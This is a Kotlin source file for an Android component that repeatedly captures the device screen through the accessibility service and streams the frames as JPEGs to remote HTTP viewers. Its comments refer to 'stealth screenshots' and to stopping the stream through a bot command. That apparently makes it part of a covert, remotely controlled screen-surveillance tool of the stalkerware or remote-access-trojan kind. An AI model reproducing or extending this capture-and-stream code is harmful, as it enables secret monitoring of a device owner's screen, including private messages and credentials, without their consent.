package com.ismartcoding.plain.services

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.view.Display
import com.ismartcoding.lib.logcat.LogCat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.resume

/**
 * Drives rapid AccessibilityService.takeScreenshot() calls and broadcasts
 * each result as a compressed JPEG to all subscribed MJPEG HTTP viewers.
 *
 * Requires Android 11+ (API 30) — same as stealth screenshots.
 *
 * Lifecycle:
 *   [connect]    — call when an HTTP viewer starts streaming. Starts the
 *                  capture loop on the first viewer.
 *   [disconnect] — call when the viewer disconnects. Stops the loop when
 *                  the last viewer leaves.
 *   [forceStop]  — emergency stop from the bot /livestop command.
 */
object LiveScreenCapturer {

    private val executor = Executors.newSingleThreadExecutor()
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * JPEG frames broadcast to all active subscribers.
     * replay=0 so late subscribers only get new frames, never stale ones.
     * extraBufferCapacity=2 so the capture loop never blocks waiting for a slow reader.
     */
    private val _frames = MutableSharedFlow<ByteArray>(replay = 0, extraBufferCapacity = 2)
    val frames: SharedFlow<ByteArray> = _frames.asSharedFlow()

    private val viewerCount = AtomicInteger(0)
    private var captureJob: Job? = null

    /** Frames per second. Clamped to [1, 15]. Default 5. */
    @Volatile
    var fps: Int = 5
        set(value) { field = value.coerceIn(1, 15) }

    val isRunning: Boolean get() = captureJob?.isActive == true
    val activeViewers: Int get() = viewerCount.get()

    /** Register a new HTTP viewer. Starts the capture loop if not already running. */
    fun connect() {
        viewerCount.incrementAndGet()
        startIfNeeded()
    }

    /** Unregister an HTTP viewer. Stops the capture loop when no viewers remain. */
    fun disconnect() {
        if (viewerCount.decrementAndGet() <= 0) {
            viewerCount.set(0)
            stopCapture()
        }
    }

    /** Force-stop regardless of viewer count (e.g. from /livestop bot command). */
    fun forceStop() {
        viewerCount.set(0)
        stopCapture()
        LogCat.d("LiveScreenCapturer: force stopped")
    }

    private fun startIfNeeded() {
        if (captureJob?.isActive == true) return
        captureJob = scope.launch {
            LogCat.d("LiveScreenCapturer: starting @ ${fps} FPS")
            while (isActive && viewerCount.get() > 0) {
                val t0 = System.currentTimeMillis()
                try {
                    val jpeg = captureJpeg()
                    if (jpeg != null) _frames.emit(jpeg)
                } catch (_: Throwable) {}
                val elapsed = System.currentTimeMillis() - t0
                val wait = (1000L / fps) - elapsed
                if (wait > 0) delay(wait)
            }
            LogCat.d("LiveScreenCapturer: capture loop exited")
        }
    }

    private fun stopCapture() {
        captureJob?.cancel()
        captureJob = null
    }

    private suspend fun captureJpeg(): ByteArray? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
        val svc = PlainAccessibilityService.instance ?: return null
        val bitmap = takeBitmap(svc) ?: return null
        return try {
            val out = ByteArrayOutputStream(bitmap.byteCount / 8)
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
            out.toByteArray()
        } catch (_: Throwable) { null }
        finally { bitmap.recycle() }
    }

    @Suppress("DEPRECATION")
    private suspend fun takeBitmap(svc: AccessibilityService): Bitmap? =
        suspendCancellableCoroutine { cont ->
            try {
                svc.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    executor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hb: HardwareBuffer = result.hardwareBuffer
                                val bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace)
                                hb.close()
                                if (bmp != null) {
                                    val sw = bmp.copy(Bitmap.Config.ARGB_8888, false)
                                    bmp.recycle()
                                    cont.resume(sw)
                                } else cont.resume(null)
                            } catch (_: Throwable) { cont.resume(null) }
                        }
                        override fun onFailure(errorCode: Int) { cont.resume(null) }
                    },
                )
            } catch (_: Throwable) { cont.resume(null) }
        }
}
